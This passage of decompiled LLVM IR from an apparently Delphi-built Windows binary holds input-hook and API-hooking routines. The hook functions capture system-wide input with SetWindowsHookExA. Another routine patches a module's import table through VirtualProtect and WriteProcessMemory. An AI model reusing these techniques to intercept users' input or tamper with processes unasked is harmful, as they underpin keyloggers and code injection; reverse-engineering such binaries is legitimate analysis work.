  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !2054
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !2054
  ret i32 %2, !insn.addr !2055
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !2056
  %2 = ptrtoint i32* %1 to i32, !insn.addr !2056
  store i32 %2, i32* @global_var_4096e8, align 4, !insn.addr !2057
  %3 = icmp eq i32* %1, null, !insn.addr !2058
  %4 = icmp eq i1 %3, false, !insn.addr !2059
  %5 = sext i1 %4 to i32, !insn.addr !2060
  ret i32 %5, !insn.addr !2061
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_4096e8, align 4, !insn.addr !2062
  %1 = inttoptr i32 %0 to i32*, !insn.addr !2063
  %2 = call i1 @UnhookWindowsHookEx(i32* %1), !insn.addr !2063
  %3 = sext i1 %2 to i32, !insn.addr !2063
  ret i32 %3, !insn.addr !2064
}

define i32 @function_407590() local_unnamed_addr {
dec_label_pc_407590:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2065
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2065
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2065
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2066
  %2 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !2067
  %3 = add i32 %2, 1, !insn.addr !2067
  store i32 %3, i32* @global_var_4096e4, align 4, !insn.addr !2067
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2068
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2069
  ret i32 0, !insn.addr !2070
}

define i32 @function_4075b5() local_unnamed_addr {
dec_label_pc_4075b5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2071
  ret i32 %0, !insn.addr !2071
}

define i32 @function_4075ba() local_unnamed_addr {
dec_label_pc_4075ba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2072
}

define i32 @function_4075bc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075bc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2073
}

define i32 @function_4075c0() local_unnamed_addr {
dec_label_pc_4075c0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096e4, align 4, !insn.addr !2074
  %2 = add i32 %1, -1, !insn.addr !2074
  store i32 %2, i32* @global_var_4096e4, align 4, !insn.addr !2074
  ret i32 %0, !insn.addr !2075
}

define i32* @function_4075c8(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_4075c8:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !2076
  ret i32* %0, !insn.addr !2076
}

define i32 @function_4075d0() local_unnamed_addr {
dec_label_pc_4075d0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2077
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2077
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2077
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2078
  %2 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2079
  %3 = add i32 %2, 1, !insn.addr !2079
  store i32 %3, i32* @global_var_4096ec, align 4, !insn.addr !2079
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2080
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2081
  ret i32 0, !insn.addr !2082
}

define i32 @function_4075f5() local_unnamed_addr {
dec_label_pc_4075f5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2083
  ret i32 %0, !insn.addr !2083
}

define i32 @function_4075fa() local_unnamed_addr {
dec_label_pc_4075fa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2084
}

define i32 @function_4075fc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4075fc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2085
}

define i32 @function_407600() local_unnamed_addr {
dec_label_pc_407600:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096ec, align 4, !insn.addr !2086
  %2 = add i32 %1, -1, !insn.addr !2086
  store i32 %2, i32* @global_var_4096ec, align 4, !insn.addr !2086
  ret i32 %0, !insn.addr !2087
}

define i32 @function_407660(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407660:
  %esp.1.reg2mem = alloca i32, !insn.addr !2088
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !2088
  %eax.0.reg2mem = alloca i32, !insn.addr !2088
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !2089
  %7 = icmp eq i8 %6, 0, !insn.addr !2089
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !2090
  br i1 %7, label %dec_label_pc_407673, label %dec_label_pc_40766b, !insn.addr !2090

dec_label_pc_40766b:                              ; preds = %dec_label_pc_407660
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !2091
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !2091
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !2091
  br label %dec_label_pc_407673, !insn.addr !2091

dec_label_pc_407673:                              ; preds = %dec_label_pc_40766b, %dec_label_pc_407660
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !2092
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !2093
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !2093
  %13 = ptrtoint i32* %12 to i32, !insn.addr !2093
  %14 = add i32 %eax.0.reload, 8, !insn.addr !2094
  %15 = inttoptr i32 %14 to i32*, !insn.addr !2094
  store i32 %13, i32* %15, align 4, !insn.addr !2094
  %16 = icmp eq i32* %12, null, !insn.addr !2095
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !2096
  br i1 %16, label %dec_label_pc_4076cb, label %dec_label_pc_40768f, !insn.addr !2096

dec_label_pc_40768f:                              ; preds = %dec_label_pc_407673
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !2097
  %18 = add i32 %eax.0.reload, 12, !insn.addr !2098
  %19 = inttoptr i32 %18 to i32*, !insn.addr !2098
  store i32 %17, i32* %19, align 4, !insn.addr !2098
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !2099
  %21 = add i32 %eax.0.reload, 16, !insn.addr !2100
  %22 = inttoptr i32 %21 to i32*, !insn.addr !2100
  store i32 %20, i32* %22, align 4, !insn.addr !2100
  %23 = add i32 %eax.0.reload, 20, !insn.addr !2101
  %24 = inttoptr i32 %23 to i32*, !insn.addr !2101
  store i32 %arg3, i32* %24, align 4, !insn.addr !2101
  %25 = load i32, i32* %22, align 4, !insn.addr !2102
  %26 = add i32 %esp.0, -8, !insn.addr !2103
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2103
  store i32 %25, i32* %27, align 4, !insn.addr !2103
  %28 = add i32 %esp.0, -12, !insn.addr !2104
  %29 = inttoptr i32 %28 to i32*, !insn.addr !2104
  store i32 %17, i32* %29, align 4, !insn.addr !2104
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !2105
  %31 = ptrtoint i32* %30 to i32, !insn.addr !2105
  %32 = add i32 %esp.0, -16, !insn.addr !2106
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2106
  store i32 %31, i32* %33, align 4, !insn.addr !2106
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2107
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !2107
  %36 = add i32 %eax.0.reload, 24, !insn.addr !2108
  %37 = inttoptr i32 %36 to i32*, !insn.addr !2108
  store i32 %35, i32* %37, align 4, !insn.addr !2108
  %38 = icmp eq i32 ()* %34, null, !insn.addr !2109
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !2110
  br i1 %38, label %dec_label_pc_4076cb, label %dec_label_pc_4076b7, !insn.addr !2110

dec_label_pc_4076b7:                              ; preds = %dec_label_pc_40768f
  %39 = load i32, i32* %24, align 4, !insn.addr !2111
  %40 = add i32 %esp.0, -20, !insn.addr !2112
  %41 = inttoptr i32 %40 to i32*, !insn.addr !2112
  store i32 %39, i32* %41, align 4, !insn.addr !2112
  %42 = load i32, i32* %15, align 4, !insn.addr !2113
  %43 = add i32 %esp.0, -24, !insn.addr !2114
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2114
  store i32 %42, i32* %44, align 4, !insn.addr !2114
  %45 = call i32 @function_407734(i32 ptrtoint (i32* @0 to i32)), !insn.addr !2115
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !2115
  br label %dec_label_pc_4076cb, !insn.addr !2115

dec_label_pc_4076cb:                              ; preds = %dec_label_pc_4076b7, %dec_label_pc_40768f, %dec_label_pc_407673
  br i1 %7, label %dec_label_pc_4076e2, label %dec_label_pc_4076d3, !insn.addr !2116

dec_label_pc_4076d3:                              ; preds = %dec_label_pc_4076cb
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !2117
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !2118
  %48 = load i32, i32* %47, align 4, !insn.addr !2118
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !2118
  br label %dec_label_pc_4076e2, !insn.addr !2119

dec_label_pc_4076e2:                              ; preds = %dec_label_pc_4076d3, %dec_label_pc_4076cb
  %49 = add i32 %eax.0.reload, 4, !insn.addr !2120
  %50 = inttoptr i32 %49 to i32*, !insn.addr !2120
  %51 = inttoptr i32 %9 to i32*, !insn.addr !2092
  ret i32 %eax.0.reload, !insn.addr !2121
}

define i32 @function_4076ec() local_unnamed_addr {
dec_label_pc_4076ec:
  %eax.1.reg2mem = alloca i32, !insn.addr !2122
  %eax.0.reg2mem = alloca i32, !insn.addr !2122
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !2123
  %4 = add i32 %3, 8, !insn.addr !2124
  %5 = inttoptr i32 %4 to i32*, !insn.addr !2124
  %6 = load i32, i32* %5, align 4, !insn.addr !2124
  %7 = icmp eq i32 %6, 0, !insn.addr !2124
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2125
  br i1 %7, label %dec_label_pc_407726, label %dec_label_pc_4076fd, !insn.addr !2125

dec_label_pc_4076fd:                              ; preds = %dec_label_pc_4076ec
  %8 = add i32 %3, 24, !insn.addr !2126
  %9 = inttoptr i32 %8 to i32*, !insn.addr !2126
  %10 = load i32, i32* %9, align 4, !insn.addr !2126
  %11 = icmp eq i32 %10, 0, !insn.addr !2126
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !2127
  br i1 %11, label %dec_label_pc_407726, label %dec_label_pc_407703, !insn.addr !2127

dec_label_pc_407703:                              ; preds = %dec_label_pc_4076fd
  %12 = add i32 %3, 4, !insn.addr !2128
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2128
  %14 = load i32, i32* %13, align 4, !insn.addr !2128
  %15 = inttoptr i32 %14 to i8*, !insn.addr !2129
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !2130
  %17 = ptrtoint i32* %16 to i32, !insn.addr !2130
  %18 = load i32, i32* %5, align 4, !insn.addr !2131
  %19 = icmp eq i32 %18, %17, !insn.addr !2131
  %20 = icmp eq i1 %19, false, !insn.addr !2132
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !2132
  br i1 %20, label %dec_label_pc_407726, label %dec_label_pc_407711, !insn.addr !2132

dec_label_pc_407711:                              ; preds = %dec_label_pc_407703
  %21 = load i32, i32* %9, align 4, !insn.addr !2133
  %22 = call i32 @function_407734(i32 %21), !insn.addr !2134
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2134
  br label %dec_label_pc_407726, !insn.addr !2134

dec_label_pc_407726:                              ; preds = %dec_label_pc_407711, %dec_label_pc_407703, %dec_label_pc_4076fd, %dec_label_pc_4076ec
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2135
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2136
  br i1 %24, label %dec_label_pc_407731, label %dec_label_pc_40772a, !insn.addr !2136

dec_label_pc_40772a:                              ; preds = %dec_label_pc_407726
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2137
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2137
  br label %dec_label_pc_407731, !insn.addr !2137

dec_label_pc_407731:                              ; preds = %dec_label_pc_40772a, %dec_label_pc_407726
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2138
}

define i32 @function_407734(i32 %arg1) local_unnamed_addr {
dec_label_pc_407734:
  %eax.0.reg2mem = alloca i32, !insn.addr !2139
  %esp.0.reg2mem = alloca i32, !insn.addr !2139
  %storemerge6.reg2mem = alloca i32, !insn.addr !2139
  %.reg2mem14 = alloca i32, !insn.addr !2139
  %esp.17.reg2mem = alloca i32, !insn.addr !2139
  %esi.08.reg2mem = alloca i32, !insn.addr !2139
  %.reg2mem = alloca i32, !insn.addr !2139
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2140
  %4 = icmp eq i1 %3, false, !insn.addr !2141
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2142
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_4077e1, label %dec_label_pc_40775a, !insn.addr !2141

dec_label_pc_40775a:                              ; preds = %dec_label_pc_407734
  %6 = trunc i32 %2 to i16, !insn.addr !2143
  %7 = trunc i32 %1 to i8, !insn.addr !2144
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2145
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2146
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2146
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2146
  %11 = icmp eq i32* %9, null, !insn.addr !2147
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2148
  br i1 %11, label %dec_label_pc_4077e1, label %dec_label_pc_4077da.preheader, !insn.addr !2148

dec_label_pc_4077da.preheader:                    ; preds = %dec_label_pc_40775a
  %12 = add i32 %10, 12, !insn.addr !2149
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2149
  %14 = load i32, i32* %13, align 4, !insn.addr !2149
  %15 = icmp eq i32 %14, 0, !insn.addr !2150
  %16 = icmp eq i1 %15, false, !insn.addr !2151
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2151
  br i1 %16, label %dec_label_pc_407773.lr.ph, label %dec_label_pc_4077e1, !insn.addr !2151

dec_label_pc_407773.lr.ph:                        ; preds = %dec_label_pc_4077da.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2145
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2152
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407773

dec_label_pc_407773:                              ; preds = %dec_label_pc_407773.lr.ph, %dec_label_pc_4077d7
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2153
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2154
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2154
  store i32 %18, i32* %25, align 4, !insn.addr !2154
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2155
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2155
  store i32 %23, i32* %27, align 4, !insn.addr !2155
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2156
  %29 = icmp eq i32 %28, 0, !insn.addr !2157
  %30 = icmp eq i1 %29, false, !insn.addr !2158
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2158
  br i1 %30, label %dec_label_pc_4077d7, label %dec_label_pc_407786, !insn.addr !2158

dec_label_pc_407786:                              ; preds = %dec_label_pc_407773
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2159
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2159
  %33 = load i32, i32* %32, align 4, !insn.addr !2159
  %34 = add i32 %33, %arg1, !insn.addr !2160
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2161
  %36 = load i32, i32* %35, align 4, !insn.addr !2161
  %37 = icmp eq i32 %36, 0, !insn.addr !2162
  %38 = icmp eq i1 %37, false, !insn.addr !2163
  store i32 %36, i32* %.reg2mem14, !insn.addr !2163
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2163
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2163
  br i1 %38, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2163

dec_label_pc_40778e:                              ; preds = %dec_label_pc_407786, %dec_label_pc_4077ce
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2164
  %40 = icmp eq i1 %39, false, !insn.addr !2165
  br i1 %40, label %dec_label_pc_4077ce, label %dec_label_pc_407793, !insn.addr !2165

dec_label_pc_407793:                              ; preds = %dec_label_pc_40778e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2166
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2166
  store i32 %20, i32* %42, align 4, !insn.addr !2166
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2167
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2167
  store i32 128, i32* %44, align 4, !insn.addr !2167
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2168
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2168
  store i32 4, i32* %46, align 4, !insn.addr !2168
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2169
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2169
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2169
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2170
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2171
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2171
  store i32 %21, i32* %51, align 4, !insn.addr !2171
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2172
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2172
  store i32 4, i32* %53, align 4, !insn.addr !2172
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2173
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2173
  store i32 %22, i32* %55, align 4, !insn.addr !2173
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2174
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2174
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2174
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2175
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2175
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2176
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2176
  store i32 %59, i32* %61, align 4, !insn.addr !2176
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2177
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2178
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2178
  store i32 %21, i32* %64, align 4, !insn.addr !2178
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2179
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2180
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2180
  store i32 %65, i32* %67, align 4, !insn.addr !2180
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2181
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2181
  store i32 4, i32* %69, align 4, !insn.addr !2181
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2182
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2182
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2182
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2183
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2184
  br label %dec_label_pc_4077d7, !insn.addr !2184

dec_label_pc_4077ce:                              ; preds = %dec_label_pc_40778e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2185
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2161
  %75 = load i32, i32* %74, align 4, !insn.addr !2161
  %76 = icmp eq i32 %75, 0, !insn.addr !2162
  %77 = icmp eq i1 %76, false, !insn.addr !2163
  store i32 %75, i32* %.reg2mem14, !insn.addr !2163
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2163
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2163
  br i1 %77, label %dec_label_pc_40778e, label %dec_label_pc_4077d7, !insn.addr !2163

dec_label_pc_4077d7:                              ; preds = %dec_label_pc_4077ce, %dec_label_pc_407786, %dec_label_pc_407793, %dec_label_pc_407773
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2186
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2149
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2149
  %81 = load i32, i32* %80, align 4, !insn.addr !2149
  %82 = icmp eq i32 %81, 0, !insn.addr !2150
  %83 = icmp eq i1 %82, false, !insn.addr !2151
  store i32 %81, i32* %.reg2mem, !insn.addr !2151
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2151
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2151
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2151
  br i1 %83, label %dec_label_pc_407773, label %dec_label_pc_4077e1, !insn.addr !2151

dec_label_pc_4077e1:                              ; preds = %dec_label_pc_4077d7, %dec_label_pc_4077da.preheader, %dec_label_pc_40775a, %dec_label_pc_407734
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2187
}

define i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4077ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2188
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2188
  %3 = load i32, i32* %2, align 4, !insn.addr !2188
  ret i32 %3, !insn.addr !2189
}

define i32 @function_4077f0() local_unnamed_addr {
dec_label_pc_4077f0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2190
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2190
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2190
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2191
  %2 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2192
  %3 = add i32 %2, 1, !insn.addr !2192
  store i32 %3, i32* @global_var_4096f0, align 4, !insn.addr !2192
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2193
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2194
  ret i32 0, !insn.addr !2195
}

define i32 @function_407815() local_unnamed_addr {
dec_label_pc_407815:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2196
  ret i32 %0, !insn.addr !2196
}

define i32 @function_40781a() local_unnamed_addr {
dec_label_pc_40781a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2197
}

define i32 @function_40781c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40781c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2198
}

define i32 @function_407820() local_unnamed_addr {
dec_label_pc_407820:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f0, align 4, !insn.addr !2199
  %2 = add i32 %1, -1, !insn.addr !2199
  store i32 %2, i32* @global_var_4096f0, align 4, !insn.addr !2199
  ret i32 %0, !insn.addr !2200
}

define i32 @function_407828(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407828:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_4077ec(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2201
  ret i32 %3, !insn.addr !2202
}

define i32 @function_407874(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407874:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2203
  %2 = icmp eq i1 %1, false, !insn.addr !2204
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_4077ec(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2205
  ret i32 %3, !insn.addr !2206
}

define i32 @function_4078a4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4078a4:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2207
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2207
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2207
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2208
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2209
  %3 = call i32 @"@LStrPos"(), !insn.addr !2210
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2211
  %6 = call i32 @"@LStrPos"(), !insn.addr !2212
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40797c to i32)
  %8 = call i32 @function_4077ec(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2213
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2214
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2215
  ret i32 %9, !insn.addr !2216
}

define i32 @function_40793c() local_unnamed_addr {
dec_label_pc_40793c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2217
  ret i32 %0, !insn.addr !2217
}

define i32 @function_407941() local_unnamed_addr {
dec_label_pc_407941:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2218
}

define i32 @function_407943(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_407943:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2219
}

define i32 @function_407953() local_unnamed_addr {
dec_label_pc_407953:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2220
}

define i32 @function_4079a0() local_unnamed_addr {
dec_label_pc_4079a0:
